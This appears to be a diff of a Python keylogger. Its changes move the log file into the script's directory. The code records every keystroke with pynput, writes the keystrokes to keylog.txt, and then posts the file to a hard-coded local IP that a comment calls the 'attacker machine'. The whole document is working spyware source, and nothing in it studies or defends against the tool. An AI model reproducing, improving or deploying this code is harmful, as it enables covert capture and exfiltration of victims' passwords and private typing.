@@ -1,12 +1,17 @@
 import requests
 from pynput.keyboard import Key, Listener
+import os
 
 counter = 0
+
+# get the directory of the current script
+script_dir = os.path.dirname(os.path.abspath(__file__))
+log_path = os.path.join(script_dir, "keylog.txt")
 
 # sends key log to attacker machine
 def send_log():
     url = "http://192.168.86.50:8000"
-    files = {'file': open("keylog.txt", 'rb')}
+    files = {'file': open(log_path, 'rb')}
     try:
         requests.post(url, files=files)
     except Exception as e:
@@ -25,7 +30,7 @@ def on_press(key):
 
 # writes keystrokes to file
 def write_file(key):
-    with open("keylog.txt", 'a') as file:
+    with open(log_path, 'a') as file:
         k = str(key).replace("'","")
         if k.find("space") > 0:
             file.write(" ")
@@ -38,7 +43,7 @@ def on_release(key):
         return False
 
 if __name__ == "__main__":
-    open('keylog.txt', 'w').close()
+    open(log_path, 'w').close()
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
     send_log()
